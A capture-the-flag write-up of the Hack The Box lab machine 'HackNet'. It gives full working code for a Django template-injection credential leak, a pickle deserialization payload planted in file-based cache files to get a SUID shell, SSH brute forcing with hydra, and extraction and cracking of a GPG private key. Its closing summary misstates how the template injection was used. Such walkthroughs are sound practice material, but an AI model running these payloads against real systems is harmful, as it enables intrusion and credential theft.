---
name: HackNet
difficulty: medium
os: linux
platform: htb
date: 2025/11/14
releasedDate: 2099-12-31
userFlag: false
rootFlag: false

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/d131f54a035866ca64f0aff0a8e1fc14.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.85 -o allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63
```

We add dns resolution for target machine in `/etc/hosts` file

```
10.10.11.85  hacknet.htb
```

Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p -sCV 10.10.11.85 -o targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: HackNet - social network for hackers
|_http-server-header: nginx/1.22.1
```

We find a web application running on port 80. We navigate to the web page and find a login and a registration page.

We register a new user and login to the application. We find a web that allows us to add posts, comments and like other users posts.

We discover a GET endpoint `/likes/<post_id>` that returns a list of users that liked a post:
```html
<div class="likes-review-item">
    <a href="/profile/4">
        <img src="/media/4.jpg" title="zero_day">
    </a>
</div>
<div class="likes-review-item">
    <a href="/profile/7">
        <img src="/media/7.png" title="blackhat_wolf">
    </a>
</div>
<div class="likes-review-item">
    <a href="/profile/10">
        <img src="/media/10.png" title="datadive">
    </a>
</div>
```

We can see there is a `title` attribute in the img tag that reveals the username of the user. This looks like a posible SSTI (Server Side Template Injection).

We also discover a GET endpoint `/like/<post_id>` that allows us to like any post in the application (even if post is private):
```
Success
```

We can use these two endpoints on our advantage.

1. Like all posts in the application using `/like/<post_id>` endpoint.
2. Change our username to a payload that take advantage of the SSTI vulnerability.
3. Visit the `/likes/<post_id>` endpoint and check the SSTI payload results.

## User Exploitation

First, we like all the posts in the application. We can do this by iterating over all the post ids and sending a GET request to the `/like/<post_id>` endpoint
```python
import requests
import re

url = "http://hacknet.htb"
cookies = {
    "csrftoken": "gND22sgd7wbhDsX3nJi2VzvgeZO3ys43",
    "sessionid": "axxrdqs5xyzhytt1f2l1ve4bqgh7tbtk"
}
myid = 27

profile_pat = re.compile(
    rf'<a\s+href="/profile/{re.escape(str(myid))}"[^>]*>.*?<img[^>]*\btitle="([^"]+)"',
    re.DOTALL | re.IGNORECASE
)

def  getKey(num):
    res1 = requests.get(f"{url}/likes/{num}", cookies=cookies)
    if not res1.status_code == 200:
        print(f"Error getting likes for post {num}")
        return None

    profile_match = profile_pat.search(res1.text)
    # see if my id (34) is in list, if remove like
    if not profile_match:
        res2 = requests.get(f"{url}/like/{num}", cookies=cookies)
        print(f"Like post {num}, status code: {res2.text}")

if __name__ == "__main__":
    for i in range(1, 101):
        getKey(i)
```

Next, we change our username to the following payload:
```
{{ users.0.email }}
```

Finally, we visit the `/likes/<post_id>` endpoint to check the SSTI payload results. First, we get emails:
```python
import requests
import re

url = "http://hacknet.htb"
cookies = {
    "csrftoken": "gND22sgd7wbhDsX3nJi2VzvgeZO3ys43",
    "sessionid": "axxrdqs5xyzhytt1f2l1ve4bqgh7tbtk"
}
myid = 27
filename = "emails.txt"

profile_pat = re.compile(
    rf'<a\s+href="/profile/{re.escape(str(myid))}"[^>]*>.*?<img[^>]*\btitle="([^"]+)"',
    re.DOTALL | re.IGNORECASE
)


def  getKey(num):
    res1 = requests.get(f"{url}/likes/{num}", cookies=cookies)
    if not res1.status_code == 200:
        print(f"Error getting likes for post {num}")
        return None

    profile_match = profile_pat.search(res1.text)

    return profile_match.group(1) if profile_match else None

if __name__ == "__main__":
    with open(filename, "a") as f:
        for i in range(1, 101):
            key = getKey(i)
            if key:
                f.write(f"{key}\n")
```

Then we change our username to the following payload:
```
{{ users.0.password }}
```

Finally we change the `filename` and we run the script again to get the passwords.

Next step is to remove domain part from emails and keep only usernames:
```bash
awk -F'@' '{print $1}' emails.txt > usernames.txt
```

Then we merge both files to get a list of valid credentials:
```bash
paste -d':' usernames.txt passwords.txt > merged.txt
```

We use `hydra` to bruteforce ssh using the valid credentials we got:
```bash
hydra -C merged.txt ssh://hacknet.htb -I
```
```
[DATA] attacking ssh://hacknet.htb:22/
[22][ssh] host: hacknet.htb   login: mikey   password: mYd4rks1dEisH3re
1 of 1 target successfully completed, 1 valid password found
```

We successfully bruteforced the ssh credentials for user `mikey`.
We ssh into the machine using the credentials we got:
```bash
ssh mikey@hacknet.htb
whoami
```
```
mikey
```

## Root Exploitation

We find the web application source code in the directory `/var/www/HackNet`. We see there is a cache configuration in the `settings.py` file:
```python
CACHES = {
    'default': {
        'BACKEND': 'django.core.cache.backends.filebased.FileBasedCache',
        'LOCATION': '/var/tmp/django_cache',
        'TIMEOUT': 60,
        'OPTIONS': {'MAX_ENTRIES': 1000},
    }
}
```

We go to the cache directory and we see there are some cache files:
```bash
ls /var/tmp/django_cache
```
We see it is a empty directory.

We try to create a cache file by searching for a word in the web application. We go to `explore` page and search for the word `diego`. This creates two cache files in the cache directory:
```bash
ls /var/tmp/django_cache
```
```
647c31ce560000c70911a27dc1f6ea1e.djcache
9521ccb242c5d9b2157674d30e05cc1.djcache
```

We will try to create a malicious cache file that will execute some code as the user `sandy`. We create a python script that will create a malicious cache file using `pickle` module:
```python
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        cmd = (
            "bash -c 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash'"
        )
        return (os.system, (cmd,))

filenames = [
    "/var/tmp/django_cache/"+"647c31ce560000c70911a27dc1f6ea1e.djcache",
    "/var/tmp/django_cache/"+"9521ccb242c5d9b2157674d30e05cc1b.djcache",
]


for filename in filenames:
    with open(filename, "wb") as f:
        pickle.dump(Exploit(), f)
```
This will create two malicious cache files that will copy `/bin/bash` to `/tmp/bash` and set the SUID bit on it.

When a search is performed on the web application, Django will look for a cache file in the cache directory. If it finds one, it will load it, if not it will create a new one. 

If we delete the cache files the application created, Django will load our malicious cache file and execute the code in it.

We run the script and then we delete the cache files the application created:
```bash
rm /var/tmp/django_cache/647c31ce560000c70911a27dc1f6ea1e.djcache
rm /var/tmp/django_cache/9521ccb242c5d9b2157674d30e05cc1b.djcache
```

We go to the `explore` page and search for the word `diego`. This will trigger Django to load our malicious cache file and execute the code in it.

We now have a SUID bash shell in `/tmp/bash`. We can use this to get a root shell:
```bash
/tmp/bash -p
whoami
```
```
sandy
```

We also find in `/var/www/HackNet` a directory called `backups` that contains some gpg encrypted sql files. We transfer those encrypted files and sandy's private key to our machine and we try to crack the password using `gpg2john` and `john`:
```bash
mkdir /tmp/hacknet && cd /tmp/hacknet
cp /var/www/HackNet/backups/* .
cp /home/sandy/.gnupg/private-keys-v1.d/armored_key.asc .
python3 -m http.server 8000
```

```bash
wget http://hacknet.htb:8000/backup01.sql.gpg
wget http://hacknet.htb:8000/backup02.sql.gpg
wget http://hacknet.htb:8000/backup03.sql.gpg
wget http://hacknet.htb:8000/armored_key.asc
gpg2john armored_key.asc > sandy_private.hash
john --wordlist=/usr/share/wordlists/rockyou.txt sandy_private.hash
```
```
sandy:sweetheart
```

We now have the password for sandy's private key. We can use this to decrypt the sql files using a clean GNUPGHOME. 
First, we create a new gpg environment to avoid messing with our own gpg configuration:
```bash
export GNUPGHOME=$(mktemp -d)
```

Then we import sandy's private key to the new gpg environment:
```bash
gpg --import armored_key.asc
```
This will ask for the passphrase. We enter `sweetheart`.

Now we can decrypt the sql files:
```bash
gpg --decrypt backup01.sql.gpg > backup01.sql
gpg --decrypt backup02.sql.gpg > backup02.sql
gpg --decrypt backup03.sql.gpg > backup03.sql
```

We find in `backup02.sql` the following content:
```
50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99.
```

We try to su to `root` using the password we found:
```bash
su root
Password: h4ck3rs4re3veRywh3re99
whoami
```
```
root
```

## Conclusion

We have successfully exploited the HackNet machine. We found a SSTI vulnerability in the web application that allowed us to execute arbitrary code as the user `sandy`. We then used a SUID bash shell to escalate our privileges to `sandy`. Finally, we cracked sandy's private key password and used it to decrypt some backup files that contained the root password.